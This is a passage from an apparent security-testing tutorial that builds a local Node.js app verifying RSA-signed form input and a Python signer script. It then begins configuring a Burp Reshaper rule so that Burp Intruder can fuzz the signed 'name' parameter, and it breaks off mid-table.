&lt;p&gt;In this scenario we will continue build upon our base64 encoder but this time
we will use it with the &lt;em&gt;Run Process&lt;/em&gt; action in Reshaper. This will help us
send complex data structures from Burp into a custom command-line tool, which
will be used in upcoming HTTP requests.&lt;/p&gt;
&lt;p&gt;For this demonstration we will use a web application that only accepts input
if the input data is provided with a valid signature. The signature
is verified with the &lt;code&gt;node-rsa&lt;/code&gt; package.&lt;/p&gt;
&lt;p&gt;We will continue using form-urlencoding as our input to further familiarize ourself
with the concept.&lt;/p&gt;
&lt;p&gt;Setup the environment and store as &lt;code&gt;app.js&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// mkdir $HOME/node-api-sign
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// cd $HOME/node-api-sign
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// npn init -y
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// npm install express body-parser node-rsa
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// openssl rsa -pubout -in private_key.pem -out public_key.pem
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;express&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;express&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;bodyParser&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;body-parser&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fs&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;fs&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;NodeRSA&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;node-rsa&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;express&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;port&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3000&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Use bodyParser to parse application/x-www-form-urlencoded bodies
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;use&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;bodyParser&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;urlencoded&lt;/span&gt;({ &lt;span style=&#34;color:#a6e22e&#34;&gt;extended&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt; }));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Load the public key from file
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;publicKey&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fs&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;readFileSync&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;public_key.pem&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;utf8&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;key&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;NodeRSA&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;key&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;importKey&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;publicKey&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;public&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;post&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/user&amp;#39;&lt;/span&gt;, (&lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;) =&amp;gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; { &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;signature&lt;/span&gt; } &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;body&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;signature&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;status&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Missing name or signature.&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// Correcting URL-decoded Base64 signature: replace spaces with plus signs
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;signature&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;signature&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;replace&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;/\s/g&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;+&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// Verify the signature
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;isVerified&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;key&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;verify&lt;/span&gt;(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;Buffer&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;from&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;signature&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;base64&amp;#39;&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;utf8&amp;#39;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;base64&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    );
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;isVerified&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;status&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;401&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Invalid signature.&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;`Name &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; has been securely stored.`&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;});
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;listen&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;port&lt;/span&gt;, () =&amp;gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;`Server running on http://localhost:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;port&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;});
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We will use the following python3 script (signer.py) to perform the signing
of the input data that will be sent to the server. The script also includes
a try statement that checks if the input to the script is base64 encoded
or not. More on this later.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python3&#34; data-lang=&#34;python3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; cryptography.hazmat.primitives &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; hashes
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; cryptography.hazmat.primitives.asymmetric &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; padding
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; cryptography.hazmat.primitives.serialization &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; load_pem_private_key
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; base64
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; os
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# pip3 install cryptography&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# Attempt to decode the base64-encoded string&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64decode(data)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; data&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;#print(&amp;#34;Input is base64&amp;#34;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Exception&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; e:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;# If decoding fails, return the original string&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;#print(&amp;#34;Input not base64&amp;#34;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Load your private key&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dir_path &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dirname(os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;realpath(__file__))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;key_path &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(dir_path, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;private_key.pem&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(key_path, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rb&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; key_file:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    private_key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; load_pem_private_key(key_file&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read(), password&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Sign the data&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;signature &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; private_key&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sign(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    data,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    padding&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;PKCS1v15(),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    hashes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;SHA256()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Encode the signature in base64 to simplify handling&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;signature_base64 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64encode(signature)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(signature_base64)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ python3 signer.py asdf
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bciDlo5cqYPWzVqPMp2L263c7wKh+21fauQBr2m1kV59S2J/hxu2lohZEiVmvwtIFxBYUkziMy0Hq33MCe3fSi7fj7CoWw5CWz95i5kxLQ01wAfsTKl5M207y9lpE6J0djYYGeidjhb6PsMm+BsoQFQ2mO09LJwMLPcEM8t2Geg7LEurlyzYBMJwtBQZB3eU4vTvWx/H0MDGdYi5jssF3GzRweXkEaopNHbrftaEEQye2uKQDdlm0+ublpmuVDsHVohosTBn74+j0LUZLCIgH/CHukh0dKL7c5YQKOdApYuwsxL16xYDfG5uOvPZdjF3yryfxjm2b2Ru1uOTsjG8bA&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ curl -X POST -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;name=asdf&amp;amp;signature=bciDlo5cqYPWzVqPMp2L263c7wKh+21fauQBr2m1kV59S2J/hxu2lohZEiVmvwtIFxBYUkziMy0Hq33MCe3fSi7fj7CoWw5CWz95i5kxLQ01wAfsTKl5M207y9lpE6J0djYYGeidjhb6PsMm+BsoQFQ2mO09LJwMLPcEM8t2Geg7LEurlyzYBMJwtBQZB3eU4vTvWx/H0MDGdYi5jssF3GzRweXkEaopNHbrftaEEQye2uKQDdlm0+ublpmuVDsHVohosTBn74+j0LUZLCIgH/CHukh0dKL7c5YQKOdApYuwsxL16xYDfG5uOvPZdjF3yryfxjm2b2Ru1uOTsjG8bA==&amp;#39;&lt;/span&gt; http://localhost:3000/user
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Awesome, our demo application works:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;reshaper-demo-signature-working.png&#34; alt=&#34;reshaper-demo-signature-working&#34;&gt;&lt;/p&gt;
&lt;p&gt;Lets say we want to use Burps intruder to fuzz to &lt;code&gt;name&lt;/code&gt; parameter. We begin
by creating a Reshaper rule for when it should trigger:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Request Direction&lt;/th&gt;
&lt;th&gt;Whens&lt;/th&gt;
&lt;th&gt;Source Message Value&lt;/th&gt;
&lt;th&gt;Source Value Type&lt;/th&gt;
&lt;th&gt;Source Value Path&lt;/th&gt;
&lt;th&gt;Match Type&lt;/th&gt;
&lt;th&gt;Match Text&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
